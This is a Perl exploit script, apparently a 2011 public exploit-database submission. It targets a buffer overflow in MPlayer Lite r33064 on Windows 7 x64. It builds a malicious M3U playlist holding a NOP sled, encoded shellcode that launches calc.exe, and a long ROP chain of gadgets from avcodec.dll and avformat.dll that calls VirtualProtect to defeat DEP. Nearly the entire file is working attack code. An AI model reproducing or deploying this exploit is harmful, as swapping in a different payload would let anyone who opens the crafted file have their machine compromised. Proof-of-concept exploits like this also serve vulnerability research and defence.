#!/usr/bin/perl
#
# Exploit Title: Mplayer BOF + ROP Exploit
# Date: 04\05\2011
# Author: Nate_M (based on original WinXP [non ROP] exploit by C4SS!0 and h1ch4m)
# Software Link: http://sourceforge.net/projects/mplayer-ww/files/MPlayer_Release/Revision%2033064/mplayer_lite_r33064.7z/download
# Version: Lite 33064
# Tested On: Win 7 x64 (doesn't work on 32 bit without heavy modification of offsets)
# CVE : None

use strict;
use warnings;
use IO::File;

print q
{
	BOF/ROP exploit created by Nate_M
	Now writing M3U file...

};

# windows/exec 			CMD=calc.exe
# x86/shikata_ga_nai 	size 227
# badchars = '\x00\x0d\x0a\x26\x2f\x5c\x3e\x3f'
my $shellcode =
"\xe8\xff\xff\xff\xff\xc8\x5a\x2b\xc9\xb1\x33" .
"\xb8\xc4\xc4\xb8\xb3\x66\x81\xec\x10\x10" .
"\x31\x42\x17\x83\xc2\x04\x03\x86\xd7\x5a\x46\xfa" .
"\x30\x13\xa9\x02\xc1\x44\x23\xe7\xf0\x56\x57\x6c\xa0\x66" .
"\x13\x20\x49\x0c\x71\xd0\xda\x60\x5e\xd7\x6b\xce\xb8\xd6" .
"\x6c\xfe\x04\xb4\xaf\x60\xf9\xc6\xe3\x42\xc0\x09\xf6\x83" .
"\x05\x77\xf9\xd6\xde\xfc\xa8\xc6\x6b\x40\x71\xe6\xbb\xcf" .
"\xc9\x90\xbe\x0f\xbd\x2a\xc0\x5f\x6e\x20\x8a\x47\x04\x6e" .
"\x2b\x76\xc9\x6c\x17\x31\x66\x46\xe3\xc0\xae\x96\x0c\xf3" .
"\x8e\x75\x33\x3c\x03\x87\x73\xfa\xfc\xf2\x8f\xf9\x81\x04" .
"\x54\x80\x5d\x80\x49\x22\x15\x32\xaa\xd3\xfa\xa5\x39\xdf" .
"\xb7\xa2\x66\xc3\x46\x66\x1d\xff\xc3\x89\xf2\x76\x97\xad" .
"\xd6\xd3\x43\xcf\x4f\xb9\x22\xf0\x90\x65\x9a\x54\xda\x87" .
"\xcf\xef\x81\xcd\x0e\x7d\xbc\xa8\x11\x7d\xbf\x9a\x79\x4c" .
"\x34\x75\xfd\x51\x9f\x32\xf1\x1b\x82\x12\x9a\xc5\x56\x27" .
"\xc7\xf5\x8c\x6b\xfe\x75\x25\x13\x05\x65\x4c\x16\x41\x21" .
"\xbc\x6a\xda\xc4\xc2\xd9\xdb\xcc\xa0\xbc\x4f\x8c\x08\x5b" .
"\xe8\x37\x55";

my $buf = "\x90" x 1000;
$buf .= $shellcode;
$buf .= "\x41" x (2368-length($buf));;
$buf .= "0000";						# VirtualProtect addr
$buf .= "1111";						# Return addr
$buf .= "2222";						# lpAddress
$buf .= "3333";						# dwsize
$buf .= "4444";						# flNewProtect
$buf .= "\x60\x63\x12\x6B";			# lpflOldProtect
$buf .= "\x41" x 76;
##### Begin ROP Chain, create anchor in memory #####
$buf .= pack('V',0x649ABC7B);		# PUSH ESP # POP EBX # POP ESI # RET	[avformat.dll]
$buf .= "\x41" x 4;
$buf .= pack('V',0x6B0402A9);		# MOV EAX,EBX # POP EBX # RET			[avcodec.dll]
$buf .= "\x41" x 4;
$buf .= pack('V',0x649509B4);		# XCHG EAX,EBP # RET					[avformat.dll]
$buf .= pack('V',0x6AD9AC5C);		# XOR EAX,EAX # RET		0				[avcodec.dll]
$buf .= pack('V',0x6AD5C728);		# ADD EAX,69 # RET		69				[avcodec.dll]
$buf .= pack('V',0x6AD79CAC);		# DEC EAX # RET			68				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x649509B4);		# XCHG EAX,EBP # RET					[avformat.dll]
$buf .= pack('V',0x6AD5130E);		# SUB EAX,EDX # RET						[avcodec.dll]
$buf .= pack('V',0x6AF1DCB5);		# XCHG EAX,ECX # RET					[avcodec.dll]
$buf .= pack('V',0x6AFA5EE9);		# MOV EAX,ECX # RET						[avcodec.dll]
$buf .= pack('V',0x649509B4);		# XCHG EAX,EBP # RET					[avformat.dll]

##### Find location of VirtualProtect() in kernel32.dll #####
$buf .= pack('V',0x6AD9AC5C);		# XOR EAX,EAX # RET		0				[avcodec.dll]
$buf .= pack('V',0x6AD5C728);		# ADD EAX,69 # RET		69				[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD) x 2;	# INC EAX # RET			6B				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		D6				[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD);		# INC EAX # RET			D7				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		1AE				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		35C				[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD);		# INC EAX # RET			35D				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		6BA				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		D74				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		1AE8			[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		35D0			[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AF1DCB5);		# XCHG EAX,ECX # RET					[avcodec.dll]
$buf .= pack('V',0x6AD5130E);		# SUB EAX,EDX # RET						[avcodec.dll]
$buf .= pack('V',0x6AE8F378);		# MOV EAX,DWORD PTR DS:[EAX] # RET		[avcodec.dll]
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6AD9AC5C);		# XOR EAX,EAX # RET		0				[avcodec.dll]
$buf .= pack('V',0x6AD5C728);		# ADD EAX,69 # RET		69				[avcodec.dll]
$buf .= pack('V',0x6AD79CAC) x 12;	# DEC EAX # RET			5D				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		BA				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		174				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		2E8				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		5D0				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		BA0				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		1740			[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD);		# INC EAX # RET			1741			[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		2E82			[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET						[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x649509B4);		# XCHG EAX,EBP # RET					[avformat.dll]
$buf .= pack('V',0x6AE62D12);		# MOV DWORD PTR DS:[EAX],EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD) x 4;	# INC EAX # RET							[avcodec.dll]

##### Find location of shellcode #####
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x649509B4);		# XCHG EAX,EBP # RET					[avformat.dll]
$buf .= pack('V',0x6B0B79D2);		# MOV EAX,EDX # RET						[avcodec.dll]
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6AD9AC5C);		# XOR EAX,EAX # RET		0				[avcodec.dll]
$buf .= pack('V',0x6AD5C728);		# ADD EAX,69 # RET		69				[avcodec.dll]
$buf .= pack('V',0x6AD79CAC) x 31;	# DEC EAX # RET			4A				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		94				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		128				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		250				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		4A0				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		940				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6AD5130E);		# SUB EAX,EDX # RET						[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x649509B4);		# XCHG EAX,EBP # RET					[avformat.dll]
$buf .= pack('V',0x6AE62D12);		# MOV DWORD PTR DS:[EAX],EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD) x 4;	# INC EAX # RET							[avcodec.dll]
$buf .= pack('V',0x6AE62D12);		# MOV DWORD PTR DS:[EAX],EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD) x 4;	# INC EAX # RET							[avcodec.dll]

##### Find approx length of shellcode #####
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6AE62D12);		# MOV DWORD PTR DS:[EAX],EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD) x 4;	# INC EAX # RET							[avcodec.dll]

##### Set shellcode to read/write #####
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6AD9AC5C);		# XOR EAX,EAX # RET		0				[avcodec.dll]
$buf .= pack('V',0x6AD5C6FD) x 4;	# INC EAX # RET			4				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		8				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		10				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		20				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6B0B4113);		# ADD EAX,EDX # RET		40				[avcodec.dll]
$buf .= pack('V',0x6B0B79D0);		# MOV EDX,EAX # MOV EAX,EDX # RET		[avcodec.dll]
$buf .= pack('V',0x6AFCD525);		# XCHG EAX,ESI # RET					[avcodec.dll]
$buf .= pack('V',0x6AE62D12);		# MOV DWORD PTR DS:[EAX],EDX # RET		[avcodec.dll]

##### And profit #####
$buf .= pack('V',0x6AD79CAC) x 16;	# DEC EAX # RET							[avcodec.dll]
$buf .= pack('V',0x6AD44B94);		# XCHG EAX,ESP # RET


$buf .= "\x41" x (5172-length($buf));;
$buf .= "\xff\xff\xff\xff";
$buf .= pack('V',0x64953AD6);		# ADD ESP,102C # POP EBX # POP ESI # POP EDI # POP EBP # RET
$buf .= "\x41" x 2000;


open(my $FILE,">Exploit.m3u") || die "**Error:\n$!\n";
print $FILE "http:// ".$buf;
close($FILE);
print "\tFile Created With Sucess\n\n";